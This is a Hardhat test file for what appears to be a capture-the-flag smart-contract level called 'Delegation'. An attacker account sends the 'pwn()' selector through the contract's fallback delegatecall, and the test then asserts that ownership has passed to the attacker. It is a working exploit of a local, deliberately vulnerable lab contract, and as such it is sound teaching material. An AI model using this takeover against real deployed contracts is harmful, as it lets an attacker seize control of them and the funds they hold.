import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { ethers } from "hardhat";
var Web3 = require("web3");

import { Delegation, Delegate } from "../typechain-types/Delegation";

describe("Delegation", function () {
  var web3 = new Web3(Web3.givenProvider);

  let appointer: SignerWithAddress;
  let delegatee: SignerWithAddress;
  let attacker: SignerWithAddress;
  let delegation: Delegation;
  let delegate: Delegate;

  before(async function () {
    [appointer, delegatee, attacker] = await ethers.getSigners();

    const DelegateFactory = await ethers.getContractFactory("Delegate");
    delegate = await DelegateFactory.connect(delegatee).deploy(
      delegatee.address
    );

    const DelegationFactory = await ethers.getContractFactory("Delegation");
    delegation = await DelegationFactory.connect(appointer).deploy(
      delegate.address
    );
  });

  describe("Deployment", function () {
    it("Appointer should own contract Delegation", async function () {
      expect(await delegation.connect(appointer).owner()).to.equal(
        appointer.address
      );
    });

    it("Delegatee should own contract Delegate", async function () {
      expect(await delegate.connect(delegatee).owner()).to.equal(
        delegatee.address
      );
    });

    it("Should delegate call if msg.data is specified", async function () {
      await attacker.sendTransaction({
        from: attacker.address,
        to: delegation.address,
        data: web3.eth.abi.encodeFunctionSignature("pwn()"),
      });
    });
  });

  describe("Claim ownership", function () {
    it("Attacker should claim ownership of the contract Delegation", async function () {
      expect(await delegation.connect(appointer).owner()).to.equal(
        attacker.address
      );
    });
  });
});
